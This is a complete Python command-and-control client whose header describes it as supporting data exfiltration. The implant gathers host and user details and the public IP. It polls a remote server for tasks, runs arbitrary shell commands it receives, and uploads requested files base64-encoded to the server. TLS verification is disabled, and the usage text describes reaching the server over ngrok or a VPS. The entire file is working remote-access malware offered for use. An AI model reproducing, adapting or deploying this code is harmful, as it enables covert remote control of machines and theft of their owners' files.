# C2 Client with Data Exfiltration (Cross-Network Support)
import urllib.request
import urllib.error
import subprocess
import time
import json
import os
import platform
import socket
import getpass
import sys
from datetime import datetime
import hashlib
import base64
import ssl

# Default server (will be overridden by command line)
DEFAULT_SERVER = "http://127.0.0.1:8080"
CHECK_INTERVAL = 5

class C2Client:
    def __init__(self, server_url, interval=5):
        self.server_url = server_url.rstrip('/')
        self.interval = interval
        self.client_info = self._get_client_info()
        self.session_start = datetime.now()
        self.task_count = 0
        self.checkin_count = 0
        self.connected = False
        self.max_retries = 3
        self.retry_delay = 5
        
    def _get_client_info(self):
        """Get detailed information about the client machine"""
        try:
            return {
                'hostname': socket.gethostname(),
                'username': getpass.getuser(),
                'platform': platform.system(),
                'platform_version': platform.version(),
                'architecture': platform.architecture()[0],
                'processor': platform.processor(),
                'python_version': platform.python_version(),
                'cwd': os.getcwd(),
                'system_time': datetime.now().isoformat(),
                'public_ip': self._get_public_ip()
            }
        except:
            return {
                'hostname': 'Unknown',
                'username': 'Unknown',
                'platform': 'Unknown'
            }
    
    def _get_public_ip(self):
        """Try to get public IP address"""
        try:
            response = urllib.request.urlopen('https://api.ipify.org', timeout=5)
            return response.read().decode('utf-8')
        except:
            return "Unknown"
    
    def _send_request(self, endpoint, data=None, method='GET', headers=None, timeout=15):
        """Send HTTP request to C2 server with error handling"""
        for attempt in range(self.max_retries):
            try:
                url = f"{self.server_url}{endpoint}"
                
                if headers is None:
                    headers = {}
                
                headers['User-Agent'] = f"C2Client/{self.client_info['hostname']}"
                
                # Create SSL context to handle HTTPS (for ngrok)
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                if data and method.upper() == 'POST':
                    if isinstance(data, dict):
                        data = json.dumps(data).encode('utf-8')
                        headers['Content-Type'] = 'application/json'
                        headers['Content-Length'] = str(len(data))
                    req = urllib.request.Request(url, data=data, headers=headers, method='POST')
                else:
                    req = urllib.request.Request(url, headers=headers, method=method)
                
                response = urllib.request.urlopen(req, timeout=timeout, context=context)
                response_data = response.read().decode('utf-8', errors='ignore')
                return response_data
                
            except urllib.error.URLError as e:
                if attempt < self.max_retries - 1:
                    print(f"[!] Connection error (attempt {attempt + 1}/{self.max_retries}): {e.reason}")
                    time.sleep(self.retry_delay)
                    continue
                else:
                    print(f"[!] Failed to connect after {self.max_retries} attempts")
                    return None
            except socket.timeout:
                if attempt < self.max_retries - 1:
                    print(f"[!] Connection timeout (attempt {attempt + 1}/{self.max_retries})")
                    time.sleep(self.retry_delay)
                    continue
                else:
                    print(f"[!] Connection timeout after {self.max_retries} attempts")
                    return None
            except Exception as e:
                if attempt < self.max_retries - 1:
                    print(f"[!] Request failed (attempt {attempt + 1}/{self.max_retries}): {type(e).__name__}")
                    time.sleep(self.retry_delay)
                    continue
                else:
                    print(f"[!] Request failed after {self.max_retries} attempts")
                    return None
    
    def _test_connection(self):
        """Test connection to C2 server"""
        print(f"[+] Testing connection to {self.server_url}...")
        response = self._send_request('/', timeout=10)
        if response and 'C2 Server Ready' in response:
            return True
        return False
    
    def execute_command(self, command):
        """Execute system command and return results"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] Executing: {command}")
        
        try:
            # Handle cd command specially
            if command.strip().lower().startswith('cd '):
                new_dir = command[3:].strip()
                try:
                    os.chdir(new_dir)
                    current_dir = os.getcwd()
                    return {
                        'command': command,
                        'stdout': f"Changed directory to: {current_dir}",
                        'stderr': '',
                        'returncode': 0,
                        'cwd': current_dir
                    }
                except Exception as e:
                    return {
                        'command': command,
                        'stdout': '',
                        'stderr': str(e),
                        'returncode': 1,
                        'cwd': os.getcwd()
                    }
            
            # Execute other commands
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                encoding='utf-8',
                errors='ignore',
                timeout=30
            )
            
            # Print output locally for debugging
            if result.stdout:
                print(f"[{timestamp}] Output: {result.stdout[:200]}...")
            if result.stderr:
                print(f"[{timestamp}] Error: {result.stderr[:200]}...")
            
            return {
                'command': command,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode,
                'cwd': os.getcwd()
            }
            
        except subprocess.TimeoutExpired:
            print(f"[{timestamp}] Command timed out after 30 seconds")
            return {
                'command': command,
                'stdout': '',
                'stderr': 'Command timed out (30 seconds)',
                'returncode': -1
            }
        except Exception as e:
            print(f"[{timestamp}] Execution error: {e}")
            return {
                'command': command,
                'stdout': '',
                'stderr': str(e),
                'returncode': -1
            }
    
    def upload_file(self, filepath):
        """Upload file to C2 server"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] Uploading file: {filepath}")
        
        try:
            filepath = filepath.strip('"\'')
            
            if not os.path.exists(filepath):
                print(f"[{timestamp}] File not found: {filepath}")
                return {'status': 'error', 'message': 'File not found'}
            
            file_size = os.path.getsize(filepath)
            print(f"[{timestamp}] File size: {file_size:,} bytes")
            
            if file_size > 50 * 1024 * 1024:  # 50MB limit
                print(f"[{timestamp}] File too large: {file_size:,} bytes")
                return {'status': 'error', 'message': 'File too large (max 50MB)'}
            
            with open(filepath, 'rb') as f:
                file_data = f.read()
            
            file_hash = hashlib.sha256(file_data).hexdigest()
            print(f"[{timestamp}] SHA256: {file_hash[:16]}...")
            
            metadata = {
                'filename': os.path.basename(filepath),
                'full_path': os.path.abspath(filepath),
                'filesize': file_size,
                'sha256': file_hash,
                'client_info': self.client_info,
                'upload_time': datetime.now().isoformat()
            }
            
            encoded_file = base64.b64encode(file_data).decode('utf-8')
            
            upload_data = {
                'filename': os.path.basename(filepath),
                'filedata': encoded_file,
                'metadata': metadata
            }
            
            print(f"[{timestamp}] Sending to server...")
            response = self._send_request('/upload', data=upload_data, method='POST')
            
            if response:
                try:
                    result = json.loads(response)
                    print(f"[{timestamp}] Upload result: {result.get('status', 'unknown')}")
                    return result
                except:
                    print(f"[{timestamp}] Upload complete")
                    return {'status': 'success'}
            else:
                print(f"[{timestamp}] No response from server")
                return {'status': 'error', 'message': 'No response from server'}
                
        except Exception as e:
            print(f"[{timestamp}] Upload failed: {e}")
            return {'status': 'error', 'message': str(e)}
    
    def handle_exfil_task(self, task):
        """Handle exfiltration task from server"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        task_type = task.get('type', '')
        task_id = task.get('task_id', '')
        
        print(f"[{timestamp}] Handling task {task_id}: {task_type}")
        
        if task_type == 'exfil':
            filename = task.get('filename', '')
            action = task.get('action', 'upload')
            
            if action == 'upload':
                filename = filename.strip('"\'')
                print(f"[{timestamp}] Upload requested: {filename}")
                
                if not os.path.exists(filename):
                    print(f"[{timestamp}] File not found: {filename}")
                    return {
                        'task_id': task_id,
                        'status': 'error',
                        'message': 'File not found'
                    }
                
                result = self.upload_file(filename)
                
                return {
                    'task_id': task_id,
                    'status': result.get('status', 'error'),
                    'message': result.get('message', ''),
                    'files_exfiltrated': [os.path.basename(filename)] if result.get('status') == 'success' else []
                }
        
        return {
            'task_id': task_id,
            'status': 'error',
            'message': f'Unknown task type: {task_type}'
        }
    
    def check_for_tasks(self):
        """Check for new tasks/commands from C2 server"""
        try:
            response_data = self._send_request('/command', timeout=20)
            
            if response_data:
                try:
                    task = json.loads(response_data)
                    if task.get('type') != 'noop':
                        print(f"[{datetime.now().strftime('%H:%M:%S')}] Received task: {task.get('type')}")
                    return task
                except json.JSONDecodeError:
                    # Handle plain text response
                    if response_data.strip() and response_data.strip() != 'C2 Server Ready':
                        return {
                            'type': 'command',
                            'command': response_data.strip()
                        }
            return None
            
        except Exception as e:
            print(f"[!] Error checking for tasks: {e}")
            return None
    
    def send_response(self, response_data):
        """Send command execution response to server"""
        try:
            if isinstance(response_data, dict):
                return self._send_request('/', data=response_data, method='POST')
            else:
                return self._send_request('/', data=str(response_data).encode(), method='POST')
        except:
            return None
    
    def send_exfil_result(self, result_data):
        """Send exfiltration task result to server"""
        try:
            return self._send_request('/exfil_result', data=result_data, method='POST')
        except:
            return None
    
    def run(self):
        """Main client loop"""
        print("\n" + "="*60)
        print("C2 CLIENT (CROSS-NETWORK)")
        print("="*60)
        print(f"Server URL: {self.server_url}")
        print(f"Hostname: {self.client_info['hostname']}")
        print(f"Username: {self.client_info['username']}")
        print(f"Platform: {self.client_info['platform']}")
        print(f"Working Dir: {self.client_info['cwd']}")
        if self.client_info.get('public_ip', 'Unknown') != 'Unknown':
            print(f"Public IP: {self.client_info['public_ip']}")
        print("="*60)
        print("Press Ctrl+C to stop")
        print("="*60 + "\n")
        
        # Test connection first
        if not self._test_connection():
            print(f"\n[!] Cannot connect to C2 server: {self.server_url}")
            print("[!] Possible reasons:")
            print("    1. Server is not running")
            print("    2. Incorrect server URL")
            print("    3. Network/firewall blocking connection")
            print("    4. Server is on a different network without tunnel")
            print(f"\n[!] Make sure server is running and accessible from this network")
            return
        
        print("[+] Connection successful!")
        self.connected = True
        
        last_checkin = datetime.now()
        checkin_interval = 30  # Print status every 30 seconds
        
        while True:
            try:
                current_time = datetime.now()
                self.checkin_count += 1
                
                # Print status periodically
                if (current_time - last_checkin).seconds >= checkin_interval:
                    uptime = current_time - self.session_start
                    print(f"[{current_time.strftime('%H:%M:%S')}] Status: Uptime {uptime}, Checkins: {self.checkin_count}")
                    last_checkin = current_time
                
                # Check for new tasks
                task = self.check_for_tasks()
                
                if task:
                    task_type = task.get('type', '')
                    
                    if task_type == 'command':
                        command = task.get('command', '')
                        if command and command.upper() != 'NOOP':
                            print(f"[{current_time.strftime('%H:%M:%S')}] Executing command: {command}")
                            result = self.execute_command(command)
                            self.send_response(result)
                    
                    elif task_type == 'exfil':
                        print(f"[{current_time.strftime('%H:%M:%S')}] Processing exfil task")
                        result = self.handle_exfil_task(task)
                        self.send_exfil_result(result)
                
                time.sleep(self.interval)
                
            except KeyboardInterrupt:
                print("\n" + "="*60)
                print("[+] Client stopped by user")
                uptime = datetime.now() - self.session_start
                print(f"[+] Session duration: {uptime}")
                print(f"[+] Total checkins: {self.checkin_count}")
                print("="*60)
                break
            except Exception as e:
                print(f"[!] Error in main loop: {e}")
                time.sleep(self.interval * 2)  # Wait longer on error

def print_usage():
    print("\n" + "="*60)
    print("C2 CLIENT - CROSS-NETWORK")
    print("="*60)
    print("\nUsage:")
    print("  python client.py <server_url> [interval]")
    print("\nExamples:")
    print("  python client.py http://192.168.1.100:8080")
    print("  python client.py https://abc123.ngrok.io")
    print("  python client.py http://yourvps.com:8080 3")
    print("\nServer URL can be:")
    print("  - Local IP: http://192.168.1.100:8080")
    print("  - Ngrok URL: https://abc123.ngrok.io")
    print("  - VPS/Domain: http://yourdomain.com:8080")
    print("  - Localhost: http://127.0.0.1:8080")
    print("="*60)

def main():
    """Main function"""
    print("C2 Client starting...")
    
    # Check for help flag
    if len(sys.argv) > 1 and sys.argv[1] in ['-h', '--help']:
        print_usage()
        return
    
    # Get server URL from command line argument or use default
    if len(sys.argv) > 1:
        server_url = sys.argv[1]
        if not server_url.startswith("http://") and not server_url.startswith("https://"):
            server_url = f"http://{server_url}"
    else:
        print("[!] Server URL not specified")
        print_usage()
        return
    
    # Get check interval from command line
    interval = CHECK_INTERVAL
    if len(sys.argv) > 2:
        try:
            interval = int(sys.argv[2])
        except:
            pass
    
    print(f"[+] Using server: {server_url}")
    print(f"[+] Check interval: {interval} seconds")
    
    # Create and run client
    client = C2Client(server_url, interval)
    client.run()

if __name__ == "__main__":
    main()